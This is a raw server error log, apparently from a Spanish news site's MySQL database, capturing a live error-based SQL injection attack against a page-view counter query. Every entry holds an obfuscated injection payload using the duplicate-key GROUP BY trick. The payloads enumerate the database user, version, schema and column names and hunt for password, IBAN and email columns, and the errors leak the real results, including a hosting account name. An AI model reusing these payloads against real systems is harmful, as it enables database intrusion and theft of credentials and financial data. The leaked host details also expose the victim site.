+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 10,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!parrafo5!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 15,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:35
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!ciudad!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 3,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!imagen5!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 14,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:33
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!clasificacion!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 2,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:32
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!parrafo3!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 11,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!imagen3!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 10,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!parrafo5!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 15,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!imagen5!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 14,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!ciudad!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 3,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!video!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 16,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!clasificacion!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 2,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!parrafo4!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 13,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!parrafo2!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 9,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:22
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!videotype!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 18,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!imagen2!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 8,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:19
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!date!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 1,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:18
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!visitas!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 17,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:17
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!parrafo!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 7,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:16
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!imagen4!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 12,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:15
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!imagen!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 6,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:13
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!titulo!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 5,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:12
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!ubicacion!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 4,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:11
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!id!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 0,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:09
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!19!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(0),0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:22:58
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!delbd!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/dAtAbAsE(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:22:57
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.7.25-log!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:22:55
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!joseifb@ps447048.dreamhost.com!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/uSeR(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 00:23:09
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x2570617373776f726425)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 00:23:06
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x256962616e25)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 00:23:04
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x25656d61696c25)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 00:23:01
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!10122!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(*),0x217e21) /**/fRoM delbd.noticias)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 00:22:59
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!noticias!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,t./**/tAbLe_nAmE,0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x2562696325 /**/gRoUp/**/bY t./**/tAbLe_nAmE /**/lImIt 0,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 00:22:57
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!delbd!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,d./**/sChEmA_NaMe,0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x2562696325 /**/gRoUp/**/bY t./**/tAbLe_nAmE /**/lImIt 0,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 00:22:54
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!1!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x2562696325)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 00:22:52
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.7.25-log!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 00:22:51
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.7.25-log!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
